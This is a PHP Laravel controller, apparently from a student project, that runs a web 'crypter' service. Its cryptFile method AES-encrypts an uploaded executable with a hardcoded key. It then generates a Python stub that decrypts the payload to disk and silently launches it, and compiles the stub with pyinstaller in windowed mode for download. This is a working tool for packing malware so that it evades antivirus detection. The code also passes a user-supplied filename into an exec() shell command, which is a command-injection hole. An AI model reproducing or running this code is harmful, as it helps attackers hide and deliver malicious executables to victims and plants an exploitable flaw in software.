<?php

namespace App\Http\Controllers;

use App\Models\Files;
use App\Traits\Upload; //import the trait
use Illuminate\Http\Request;

class FileController extends Controller
{
    use Upload;

    public function store(Request $request, $user)
    {
        $folder = $user;
        $request->validate([
            'filename' => 'required|string|max:20'
        ]);

        $file = str_replace(' ', '_', $request->input('filename'));
        $size = $request->file('file')->getSize();
        if ($request->hasFile('file')) {
            $path = $this->UploadFile($request->file('file'), $folder, $file);
            Files::create([
                'path' => $path,
                'filename' => $file,
                'size' => $size,
                'user' => $user
            ]);
            return redirect()->route('home')->with('success', 'File Uploaded Successfully');
        }
    }

    public function index(){
        $user = auth()->user(); 

        $files = Files::where('user', $user->name)->get();

        //return dd($files);
        return view('home', compact('files'));
    }

    public function deleteFile($id){
        $user = auth()->user(); 

        $file = Files::where('id', $id)->where('user', $user->name)->first();

        unlink('/opt/lampp/htdocs/Trabalho_PW2/web_crypter/storage/app/public/' . $file->path);
        $file->delete();

        return redirect()->back()->with('success', 'Arquivo excluído com sucesso!');
    }

    public function cryptFile($id){
        $user = auth()->user(); 
        $file = Files::where('id', $id)->where('user', $user->name)->first(); 

        define('KEY', '0123456789123456');
        define('IV', '1234567890123456'); 

        $inputfile = $file->path;
        $outputfile = "decrypted.exe";
        $stubname = "stub_" . $file->filename . ".py";

        $plaintext = file_get_contents('/opt/lampp/htdocs/Trabalho_PW2/web_crypter/storage/app/public/' . $inputfile);
        $ciphertext = openssl_encrypt(
            $plaintext,
            'aes-128-ctr',
            KEY,
            OPENSSL_RAW_DATA,
            IV
        );

        $key_hex = bin2hex(KEY);
        $ciphertext_hex = bin2hex($ciphertext);

        $stubcode = <<<PYTHON
        import pyaes
        import subprocess
        import binascii

        KEY = binascii.unhexlify('$key_hex')
        executavel_crypt = binascii.unhexlify('$ciphertext_hex')
        dropfile = '$outputfile'

        # Descriptografar e executar
        executavel_decrypt = pyaes.AESModeOfOperationCTR(KEY).decrypt(executavel_crypt)
        with open(dropfile, "wb") as file:
            file.write(executavel_decrypt)

        subprocess.Popen(dropfile)
        PYTHON;

        file_put_contents('/opt/lampp/htdocs/Trabalho_PW2/web_crypter/storage/app/public/' . $user->name . "/" . $stubname, $stubcode);

        $command = "cd /opt/lampp/htdocs/Trabalho_PW2/web_crypter/storage/app/public/{$user->name} && " .
                "pyinstaller --onefile --clean --windowed {$stubname}";
        exec($command);

        //$stubpath = "/opt/lampp/htdocs/Trabalho_PW2/web_crypter/storage/app/public/" . $user->name . "/dist/stub_" . $file->filename . "";
        
        //return exec('cat /opt/lampp/htdocs/Trabalho_PW2/web_crypter/storage/app/public/' . $user->name . "/dist/stub_" . $file->filename);
        return response()->download(storage_path('/app/public/' . $user->name . '/dist/stub_' . $file->filename));


    }
}